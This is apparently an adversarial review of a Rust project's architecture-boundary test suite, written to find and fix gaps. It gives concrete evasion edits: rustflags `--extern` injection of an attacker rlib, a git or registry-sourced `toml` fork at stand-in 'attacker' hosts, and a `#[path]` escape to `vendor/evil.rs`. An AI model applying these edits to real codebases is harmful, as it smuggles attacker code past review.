# Critic 5 — concrete-evasion review of the architecture-boundary suite

VERDICT: residuals-found (3 critical / 2 major / 5 minor)

Scope reviewed read-only, by hand, no builds: `crates/gauntlet-arch-tests/**`,
`tests/contract/*.rs`, the workspace root manifest, the four core-crate
manifests and sources, `Cargo.lock`, `.env.example`, `justfile`, and the
frozen standard (`.wayfinder/answer-key.md` AK-001/002/016/019; Core-spec
§4.1, §8.1, §24.3). Every finding below carries the exact edit and a trace
through the scanner code showing why nothing fires. Findings I could not
trace end-to-end were not filed.

---

## Critical findings

### C1 — `[target.*] rustflags` in `.cargo/config.toml` is unexamined; `--extern` compiles an arbitrary rlib into a core crate

**Severity: critical** (compiles attacker-chosen code into `gauntlet-domain`
with every locator green).
**Where:** `crates/gauntlet-arch-tests/src/deps.rs:798-835` (`check_cargo_config`).
The function reads and parses both `.cargo/config.toml` and `.cargo/config`,
then inspects exactly two things: any `[source.*]` key (deps.rs:815-823) and
`[build].rustflags` (deps.rs:824-832). Cargo accepts rustflags under
**target-scoped tables** — `[target.'cfg(all())']` and `[target.<triple>]` —
which live under the `target` key, not `build`. Cargo applies them to every
rustc invocation for a matching target, exactly like `[build].rustflags`.

**The edit.** Create `.cargo/config.toml` (the repo has none today):

```toml
[target.'cfg(all())']
rustflags = ["--extern", "shadow=vendor/libshadow.rlib"]
```

Build the attacker crate once anywhere (`vendor/` at repo root — outside
`crates/**`, so `discover_package_dirs` never sees it, and outside all four
core crates, so no walker ever reads it), and add one line to
`crates/gauntlet-domain/src/lib.rs`:

```rust
pub use shadow::backdoor;
```

rustc merges the RUSTFLAGS `--extern` with cargo's own; `use shadow::…`
resolves through the extern prelude; `gauntlet-domain` now compiles the
attacker's code while its manifest still declares zero dependencies.

**Trace.**
- `check_dependency_direction` → `deps::check_cargo_config` (lib.rs:144,
  deps.rs:798): file parses; `table.get("source")` → `None`; `table.get("build")`
  → `None` (the config has only a `[target]` table). Returns `Vec::new()`. The
  on-disk test `cargo_config_source_replacement_and_rustflags_are_flagged`
  (deps.rs:1421-1471) fixtures only `[build] rustflags` and `[source.*]`, so
  the pin does not widen the check either.
- No member manifest changed → `check_member` clean; root manifest unchanged.
- `check_scope_integrity`: `vendor/libshadow.rlib` is not under a core crate,
  so the walker never lists it; `crates/gauntlet-domain/src/lib.rs` is scanned
  but contains no `#[path]`/`include!` → `scan_escapes` returns nothing.
- `check_denylist` / `check_adapter_selection`: `shadow`/`backdoor` match no
  `DENIED_TERMS` entry (denylist.rs:92-153) and no derived adapter identifier.
- `check_no_hardcoded_literals`: no literal at all in the added line.
- `check_env_example`: untouched.
- `just boundaries` runs `cargo nextest run -p gauntlet-arch-tests` from the
  repo root (justfile), so cargo *does* read this `.cargo/config.toml` — the
  channel is live for the exact command the gate runs.

All four locators green; attacker code compiled into `gauntlet-domain`.
Adjacent unexamined keys in the same file (`[target.*] linker`, `[registries.*]`
— see C2) widen the same hole. `$CARGO_HOME/config.toml` and the
`CARGO_BUILD_RUSTFLAGS`/`RUSTFLAGS` environment variables are the same channel
outside the repo; I count those as environment trust, disclosed below.

### C2 — the external allowlist admits by *name*, never by *source*: a git/registry-sourced `toml` swaps the gate's own parser, and through it any dependency into `gauntlet-domain`

**Severity: critical** (chain compiles an attacker-chosen dependency into
`gauntlet-domain` with every locator green; the first hop alone hands the
instrument's parser to the attacker).
**Where:** `crates/gauntlet-arch-tests/src/deps.rs:591-595`:

```rust
let allow = layer.allowed_external();
for dep in declared.external {
    if allow.contains(&dep.name.as_str()) {
        continue;                       // <-- source kind never consulted
    }
```

`declared_deps` faithfully classifies the source (`ExternalSource::Git`,
`Registry`, …, deps.rs:402-431) and even renders it in the violation text —
but an allowlisted *name* short-circuits before any of that matters. The one
non-empty allowlist is `BOUNDARY_TESTS_EXTERNAL_ALLOWLIST = ["toml"]`
(deps.rs:119). The root table is separately guarded against git
(deps.rs:372-379); the **member manifest is not**.

**The edit.** In `crates/gauntlet-arch-tests/Cargo.toml`, replace
`toml.workspace = true` with:

```toml
[dependencies]
toml = { git = "https://github.com/attacker/toml-fork", branch = "main" }
```

**Trace of the first hop (everything green):**
- `declared_deps` (deps.rs:452-530): fields contain `git` → `source = Git`;
  `dep = "toml"`; not a member → `external`. `check_member`: layer
  `BoundaryTests`, `allow = ["toml"]`, `allow.contains("toml")` → `continue`.
  No violation. (Contrast: the same git source on any *unlisted* name is
  flagged with "a git source" — the guard exists, it just never runs for
  listed names.)
- The root manifest keeps `toml = "0.9"` in `[workspace.dependencies]` —
  unused now, but still legal (`check_workspace_dependency_table`: registry
  entry, package `toml` ∈ union).
- `gauntlet-arch-tests` is not in `CORE_CRATES` (walk.rs:20-25), so
  `check_denylist`/`check_adapter_selection`/`check_no_hardcoded_literals`
  never read its manifest or sources. `check_scope_integrity` walks only the
  core crates. The `evidence_locators` pin (lib.rs:1314-1381) asserts only the
  four `[[test]]` blocks, not the `[dependencies]` form.

**Trace of the chain into the domain.** The attacker's `toml` fork is an
ordinary `toml`-shaped library whose `from_str` under-reports: parsing
`[dependencies]\nserde = "1"` yields a table without the `dependencies` key.
Now add `serde = "1"` to `crates/gauntlet-domain/Cargo.toml`:
- Real cargo uses its own manifest parser, sees `serde`, and compiles serde
  into `gauntlet-domain`.
- `check_dependency_direction` parses that same manifest with the *attacker's*
  `toml` (deps.rs:458 `parse_table`) → the section vanishes →
  `dependency_sections` returns nothing → no internal, no unresolved path, no
  external → domain clean.
- `check_denylist`'s `scan_manifest` (denylist.rs:367-372) parses with the
  same crate → no sections → clean; the raw-text `scan_source` pass sees
  `serde = "1"`, which matches no denied term.

Every locator green; `serde` compiled into `gauntlet-domain`; AK-001 defeated.

A variant with no git URL at all: `toml = { version = "0.9", registry = "mirror" }`
plus `.cargo/config.toml` `[registries.mirror] index = "sparse+https://attacker/x"`.
`check_cargo_config` inspects only `[source]`/`[build]` (C1), and the
`registry` field of a dependency spec is never inspected anywhere; the
root-table form passes identically because `check_workspace_dependency_table`
(deps.rs:381-394) checks only `path`/`git`/name. The `[patch.crates-io] toml`
substitution the suite *does* catch (deps.rs:742-789) is simply the one
spelling of this attack that was closed.

### C3 — `attribute_body_end` counts brackets blind to string literals: a `]` inside a predicate string hides a `#[path]` escape

**Severity: critical** (compiles an arbitrary file from outside the crate
into any core crate with every locator green).
**Where:** `crates/gauntlet-arch-tests/src/escapes.rs:224-241`
(`attribute_body_end`) consumed by the attribute loop at escapes.rs:196-209.
The bracket-depth counter never enters a string-literal state, so a `]` that
is *data* closes the attribute body early; `attribute_path_arguments` then
searches only the truncated body and the outer loop resumes *after* the
`[`, never re-reading the tail that contained the `path` key.

**The edit.** In `crates/gauntlet-domain/src/lib.rs`:

```rust
#[cfg_attr(not(doc = "]"), path = "../../../vendor/evil.rs")]
mod evil;
```

and place attacker code at `vendor/evil.rs` (repo root, outside `crates/**`
and outside every core crate).

rustc parses `#[cfg_attr(PRED, path = "…")]`; `cfg(doc = "]")` is false
(`doc` is only set under rustdoc), so `not(…)` is true and the `path` key
applies: `mod evil` loads `crates/gauntlet-domain/src/../../../vendor/evil.rs`
= `<repo>/vendor/evil.rs`. (It may emit an `unexpected_cfg_doc` *warning*;
warnings do not fail `cargo nextest`, and the criterion here is the test
targets.)

**Trace.**
- `scan_escapes` (escapes.rs:98-117) iterates `text::scan_units` — physical,
  logical, statement, escape-decoded forms all carry the same `]`-in-string.
- The attribute loop finds `#` at 0, `open` at the `[` (index 1).
- `attribute_body_end(bytes, 1)` (escapes.rs:224-241): depth = 1 at `[`; the
  first `]` encountered is the one inside the predicate string `"]"` → depth
  0 → returns just past it. The body handed to `attribute_path_arguments` is
  `#[cfg_attr(not(doc = "]` — the substring `path` does not occur in it.
- `from = open + 1` (escapes.rs:203); the next `find('#')` finds nothing —
  the tail `, path = "../../../vendor/evil.rs")] mod evil;` is never scanned.
- The existing tests (escapes.rs:510-527, 530-557) cover `cfg_attr(all(), …)`
  and whitespace spellings, but no fixture puts a `]` inside a string inside
  an attribute, so the pin does not catch it either.
- `check_denylist`/`check_adapter_selection`: `vendor/evil.rs` is not under a
  core crate, so its contents (any vendor term, any adapter identifier, any
  literal) are never scanned. The declaring line matches no denied term.
- `check_no_hardcoded_literals`: the path string contains no literal class
  trigger on that line (`../../../vendor/evil.rs` does not start with `/`, is
  not inside a `const`, is not multi-token).
- No manifest changed → `check_dependency_direction` clean; `undeclared
	packages` walks only `crates/**`, so `vendor/evil.rs` is invisible there
  too (deps.rs:676-727).

Same truncation also hides an `include!`-style payload delivered inside an
attribute, and defeats the `#[cfg_attr(target_os = …, path = …)]` form
whenever a `]`-bearing string can precede the key. The fix shape is to make
`attribute_body_end` skip `"…"`/`r#"…"#` spans, exactly as `read_string_literal`
already knows how to.

---

## Major findings

### M1 — a ≥25-line split defeats the timeout and tier-policy classes (`MAX_STATEMENT_LINES`)

**Severity: major** (defeats the timeout and tier clauses of AK-016 with a
formatting-only edit).
**Where:** `crates/gauntlet-arch-tests/src/text.rs:120` (`MAX_STATEMENT_LINES
= 24`), join loop text.rs:180-187; consumers `find_timeout`
(literals.rs:1037-1047) and `find_tier_policy` (literals.rs:1050-1071), both
of which require identifier and value in one scan unit.

**The edit.** In `crates/gauntlet-app/src/lib.rs` (24 filler lines push the
value past the join window):

```rust
pub const STALL_TIMEOUT_MS: u64 =
    //
    //   … exactly 24 filler lines …
    //
    900_000;
pub static REVIEW_MODE: &str =
    //
    //   … exactly 24 filler lines …
    //
    "adversarial";
```

**Trace.** Line 1 ends with `=` → `opens_continuation` joins the next
`take(24)` lines (text.rs:180-187) = physical lines 2-25; the value on line
26 is excluded. The physical line `    900_000;` is its own unit: `numeric_
literals` records it, but its `introducer` is `None` (nothing but spaces
precede it in that unit), and `find_timeout` additionally needs a
`TIMEOUT_HINTS` fragment *in the same unit* — the identifier with `STALL` is
25 lines away. `find_tier_policy` needs `const `/`static `/`default` in the
same unit as the `"adversarial"` literal — same split, same silence. No other
unit form joins them: `logical_lines` only collapses string continuations and
`concat!` fragments; the decoded form only decodes escapes. 900_000 is not a
`WELL_KNOWN_PORTS` value, so nothing else fires. The constant doc at
text.rs:118-119 says "the physical lines are still scanned" but does not
disclose that the two same-unit classes go silent past the bound, and the
disclosed residuals in literals.rs (lines 58-83) do not cover it.

### M2 — a scheme-less provider endpoint literal passes every AK-016 class

**Severity: major** (defeats the provider/URL clause of AK-016 with a
one-line edit; undisclosed — the URL class is documented as complete over
`scheme://`, literals.rs:641-661, and the provider class as whole-literal
only, so this shape falls between two disclosed narrowings).
**Where:** `crates/gauntlet-arch-tests/src/literals.rs:641-661`
(`find_url_scheme` requires `://`), `literals.rs:808-843`
(`find_network_endpoints` requires `host:port`), `literals.rs:1028-1033`
(whole-literal provider match).

**The edit.** In `crates/gauntlet-app/src/lib.rs`:

```rust
pub const PROVIDER_BASE: &str = "api.deepinfra.com/v1";
```

`deepinfra` is in the artifact's own `PROVIDER_IDENTITIES`
(literals.rs:114-148) — the artifact itself classes it as a provider — yet it
is not a `DENIED_TERMS` entry (denylist.rs:92-153), so the denylist does not
backstop it.

**Trace.** Unit = the single physical line.
- absolute path: the `/` before `v1` is preceded by `m`, a path-context byte
  → skipped (literals.rs:529-553); the literal does not start with `/`
  (literals.rs:569-574); no drive root.
- relative path: segments `["api.deepinfra.com", "v1"]`, final segment `v1`
  has no `.` → not extension-shaped (literals.rs:615-637).
- URL: no `://` → `find_url_scheme` returns `None`.
- model id: no `MODEL_FAMILIES` match at a boundary ("deepinfra" ≠
  "deepseek").
- endpoint: after the dotted host the next byte is `/`, not `:` → not
  `host:port`; no `[v6]:port`; no IPv4.
- port/timeout: no qualifying number. command: single token (< 2). tool
  identity / provider: whole-literal equality fails (`api.deepinfra.com/v1`
  ≠ `deepinfra`). tier: no tier vocabulary, and `v1` fails `tier-<digit>`.
- denylist: no `DENIED_TERMS` substring; not a derived adapter identifier or
  whole-literal segment.

Green — a hardcoded provider endpoint compiled into the application layer.
Adding a port (`:443`) or scheme would fire the endpoint/URL class; the
evasion is exactly the scheme-less, port-less spelling.

---

## Minor findings

### m1 — the evidence-locator pin is mention-shaped, not call-shaped

**Where:** `crates/gauntlet-arch-tests/src/lib.rs:1366-1379`. The pin asserts
each locator file `contains("#[test]")` and `contains("check_")`. Gutting
`tests/contract/architecture_boundaries.rs`'s `denylist` test to
`fn denylist() { let _ = "check_"; }` keeps the pin green while the AK-002
locator no longer calls `check_denylist`. The in-crate `mod repo` tests
(denylist.rs:457-479) still run the check, so this is evidence/locator
degradation, not a disabled gate — but the module's own standard elsewhere is
"mentioning … in prose is not being the table" (lib.rs:496-499); the pin
should require a real call, e.g. `contains("check_denylist(")`.

### m2 — UNC paths are not recognized as absolute and join "inside" the crate

**Where:** `crates/gauntlet-arch-tests/src/escapes.rs:448-456` (`is_absolute`
checks `/` and drive letters only) and `escapes.rs:468-485` +
`escapes.rs:316-336` (backslashes are normalized and empty segments dropped).
`#[cfg_attr(all(), path = "\\\\server\\share\\evil.rs")] mod evil;` —
`read_string_literal` unescapes to `\\server\share\evil.rs`; `is_absolute` is
false; `normalize_join` replaces `\` with `/`, filters empty segments, and
produces `<crate>/src/server/share/evil.rs` → "inside" → no violation, while
rustc on a Windows target treats the value as an absolute UNC path. The
declaring file is scanned and reports nothing. Windows-target-only (this repo
builds on Linux), hence minor.

### m3 — a bare secret token in an `.env.example` comment passes both credential channels

**Where:** `crates/gauntlet-arch-tests/src/envfile.rs:111-124`
(`raw_credentials` — keyed prefixes only, at a boundary) and
`envfile.rs:134-160` (`commented_entry_values` — requires an
`UPPERCASE_KEY=` shape). The line

```
# rotate the deepinfra key: 9f86d081884c7d659a2feaa0c55ad015
```

matches no `CREDENTIAL_SHAPES` prefix and no `KEY=` shape → no violation.
AK-019's "no credentials" is about the file; the critic-4 m1 note
(envfile.rs:41-51) closes the key-shaped comment channel and discloses the
prefixed-token limitation, but a bare token in free-form comment prose is
neither caught nor listed as a residual. Only an entropy/shape heuristic
would catch it; filed so the residual is at least written down.

### m4 — unlisted well-known ports pass the port class

**Where:** `crates/gauntlet-arch-tests/src/literals.rs:156-159`
(`WELL_KNOWN_PORTS`). `let bind_port: u16 = 8081;` is green. §8.1 says "no
port number is a literal"; the class is an enumerated set, and the residual
section (literals.rs:22-56) does not mention unlisted ports. The pins
(literals.rs:1763-1769) make the inventory honest but not complete. Disclosed
posture ("curated") but the incompleteness itself is not in the residual
list.

### m5 — spelling variants of listed tool identities launder through a const

**Where:** `crates/gauntlet-arch-tests/src/literals.rs:1015-1023`
(`find_tool_identity`, exact whole-literal match over the union of
`TOOL_IDENTITIES` and `COMMAND_HEADS`). `pub const GIT: &str = "git.exe";`
plus `std::process::Command::new(GIT)` is green: `"git.exe"` is in neither
list (single token, so the command class's `≥2` tokens does not apply), and
the `Command::new(` branch (literals.rs:977-983) only fires when a string
literal is on the same unit. `.exe`/`.cmd`/full-path spellings of listed
tools are one family with the disclosed enumerated-inventory residual, but
the laundering shape (variant + const) is not written down.

---

## Probed and found CLOSED (with evidence)

- **Member dependency sections of every kind** — normal, dev, build, and all
  `target.<cfg>.{dependencies,dev-dependencies,build-dependencies}`:
  `dependency_sections` walks them all (deps.rs:228-249); dotted-key and
  inline-table spellings parse to the same TOML; `package=` renames are
  resolved before classification (deps.rs:469-471); weak-dep `foo? = "1"`
  keys classify as external non-members and fail against the empty allowlists
  (fail-closed). E2E'd by `c1_external_dependencies_compiling_into_the_domain_
  fail_the_gate` (lib.rs:1034-1110) and unit tests deps.rs:1261-1343.
- **Root `[workspace.dependencies]`** — path must resolve to a declared
  member, git is a violation outright, anything else must be on the union
  allowlist (deps.rs:345-396); `join_posix` normalizes `.`, `..`, trailing
  slashes, and backslashes so the member comparison cannot be spelling-tricked
  (deps.rs:862-879); workspace-inherited renames resolve through the root map
  with a fail-closed parse (deps.rs:497-507, lib.rs:338-352).
- **`[patch]`/`[replace]`** — must resolve to a member by `path`; git and
  registry patches are violations on their own (deps.rs:742-789); `[replace]`
  string values always flag (over-strict, safe direction). Member-level
  `[patch]` is not honored by cargo, so the root-only read is correct —
  except the allowlist-source hole filed as C2, which is not a patch.
- **Membership discovery** — packages under `crates/**` not in
  `[workspace].members` are violations (deps.rs:676-727, 840-853); unreadable
  subtrees are violations, not skips (V18); glob members fail closed in
  `read_members` (deps.rs:625-653); unclassified member names are violations
  (deps.rs:211-223, 541-549). Symlinked package directories are still
  discovered via the `Cargo.toml` `is_file()` follow (deps.rs:706-708).
- **Walker integrity** — symlinks inside core crates are violations
  (walk.rs:129-140); unreadable, non-UTF-8, and >1 MiB files are violations
  (walk.rs:207-234); the anti-vacuity guard measures the walk against an
  independent `unfiltered_listing` sharing no code with it (walk.rs:168-195,
  lib.rs:254-331); scope predicates are pinned so no subtree can be carved out
  (walk.rs:281-362, lib.rs:851-928).
- **Source-file escapes** — `#[path]` structural matcher covers `#[ path ]`,
  `#[PATH]`, `cfg_attr`, `# [` (escapes.rs:168-269); whitespace-split
  `include ! (…)` matches (escapes.rs:171-194); `include!(concat!(env!(…)))`
  and any non-plain-string argument are violations (escapes.rs:286-295);
  `\x2f`-encoded escape paths are caught through the escape-decoded scan-unit
  form (text.rs:202-270 feeding escapes.rs:101-103) — I tried this one
  specifically and it fires; line continuations and `concat!` fragments join
  (text.rs:63-116, 381-391); absolute and drive-letter targets flag
  (escapes.rs:141-150).
- **Cargo target relocation** — `[lib]`/`[[bin]]`/`[[test]]`/`[[bench]]`/
  `[[example]]` `path` escaping the crate flags (escapes.rs:376-417); the one
  exemption (`crates/gauntlet-arch-tests`, for the answer-key locators) is
  pinned to exactly itself and tested against all core crates
  (escapes.rs:61-82, 745-757). Autodiscovered `src/bin`, `tests/`, `benches/`
  live inside the crate and are walked.
- **Build scripts** — a `build.rs` at a core crate root is a violation with
  no manifest key (escapes.rs:437-446); `[package] build = <anything but
  false>` is a violation (escapes.rs:422-429).
- **Denylist matching** — case-insensitive substring over compound
  identifiers (denylist.rs:299-301); adapter identifiers derived in every
  spelling including reversed segments and `_` forms (denylist.rs:186-233),
  shortest distinguishing segments as whole literals (denylist.rs:280-287,
  330-344); the composition-root carve-out masks with a *space* and never
  skips a unit, and cannot splice terms (denylist.rs:262-270, tests at
  731-784); manifest keys, renames, workspace inheritance, `[features]`,
  `[package.metadata]` all reached (denylist.rs:360-426 + raw-text pass);
  the root `[workspace.dependencies]` table is text-scanned at true line
  numbers (denylist.rs:439-455, lib.rs:394-400). The allowlists are pinned
  empty by test (deps.rs:1236-1258), so widening is a visible edit.
- **Literal-scan normalization** — continuations, `concat!` (incl. raw and
  comment-separated fragments), `\x`/`\u{}` escapes, rustfmt breaks after and
  *before* the `=`, all joined (text.rs:63-298, tests 397-599).
- **Defaults exemption** — exactly one file, denylist still applies to it,
  warrant is declaration-shaped (`const <setting>` for all six §8.6 settings),
  and siblings stay policed (lib.rs:500-545, walk.rs:53-64, tests lib.rs:1181-
  1234).
- **Env file** — Annex E ↔ `.env.example` verified identical today (92 = 92,
  by extraction); duplicate keys, unknown keys, non-`GAUNTLET_` keys,
  non-empty values, credential-shaped values, commented credentials with
  known prefixes, commented `KEY=value` entries, the runtime-injected
  singleton (pinned, both directions), and the derived spec-wide floor are
  all enforced (envfile.rs:263-401); `GAUNTLET_RESULT_PATH` correctly absent
  from both spec annex and file.

## Disclosed residuals I judge genuinely disclosed (not defects)

- Runtime-assembled strings defeat every text scanner — stated in both
  denylist.rs:64-72 and literals.rs:78-83.
- Enumerated inventories (model families, provider identities, command
  heads) miss unlisted names — literals.rs:30-49.
- Tier class narrowed to `const`/`static`/`default` lines vs. parsing
  vocabulary — literals.rs:34-40.
- Extension-less relative path literals indistinguishable from slash
  vocabulary — literals.rs:51-56.
- Timeout hint list is enumerated (`BUILDER_LIMIT` passes) — literals.rs:61-66.
- Composition root deliberately outside the adapter-identifier rule, kept
  inside the other two scans with a cross-check — walk.rs:37-44,
  lib.rs:445-467.
- Lockstep spec + annex + `.env.example` deletion reads clean because the
  floor is spec-derived — envfile.rs:39-51; moving the ruler is a ruler
  change, not a suite evasion.
- Environment-level trust: `$CARGO_HOME/config.toml`, `RUSTFLAGS`/
  `CARGO_BUILD_RUSTFLAGS`, and PATH-shimmed toolchains are outside any repo
  scanner's reach. The in-repo spellings of those channels are C1; the
  out-of-repo ones are environment assumptions I record rather than file.

## Summary

The manifest-facing half of the gate (dependency sections, inheritance,
patches, membership, allowlists) is closed fail-closed and unusually well
pinned against vacuity. The three critical holes are all in the *other* half:
the two redirection channels cargo owns that the suite reads only partially
(`.cargo/config.toml` target tables; allowlist-by-name ignoring source kind),
and one tokenizer blind spot (bracket counting through string data). Each
defeats AK-001/AK-002 with all four locators green. The two majors are
formatting/spelling evasions of AK-016 classes whose disclosed residuals do
not cover them.
